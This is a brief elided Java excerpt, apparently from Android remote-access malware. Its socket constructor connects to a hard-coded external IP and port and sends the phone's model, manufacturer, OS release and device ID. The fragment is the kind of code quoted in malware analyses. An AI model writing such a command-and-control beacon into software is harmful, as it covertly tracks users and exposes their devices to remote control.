...
public class IOSocket {
    ...
    private IOSocket() {
        try {
            ...
            ioSocket = IO.socket("http://41.216.190.191:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
